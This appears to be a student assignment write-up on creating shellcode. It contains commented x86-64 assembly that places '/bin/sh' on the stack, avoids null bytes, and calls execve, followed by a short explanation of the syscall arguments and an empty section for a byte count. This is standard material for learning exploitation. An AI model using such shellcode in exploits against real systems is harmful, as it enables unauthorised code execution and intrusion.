## ShellCode Creation
# A code block containing your assembly instructions for your shellcode 
```
.text
.global _start
_start:
	movabsq $0x68732f6e69622f20, %rax /* move 64 bits into rax */
	shr $8, %rax /* remove null terminators by shifting down 8 bits */
	pushq %rax /* push the above -> stack /bin/sh\0 [1st arg] */
	
	/* rdi holds 1st arg of func */
	/* pointer to path to be executed */
	movq %rsp, %rdi /* /bin/sh to rdi */
	
	/* rsi holds 2nd arg of func array of command line args */
	/* array of command line args to pass */
	xorq %rax, %rax /* set to 0 */
	pushq %rax /* push null terminator -> stack */
	pushq %rdi /* push /bin/sh -> stack */
	movq %rsp, %rsi /* point (mov) /bin/sh to rsi */
	
	/* rdx 3rd arg of env var */
	/* no environment variables to pass */
	movq %rax, %rdx /* set to 0 */
	
	addq $0x3b, %rax /* move execve into rax */
	
	syscall
	
	leave
	ret
	
```


# A step-by-step explanation of your assembly code and how it sets up the system call 
To execute : execve (char *pathname, char **argv, char **envp) 

pathname : /bin/sh			argv : [ /bin/sh, NULL]				envp : NULL


# Report how many bytes total are in your assembly, and include the whole thing in ascii 


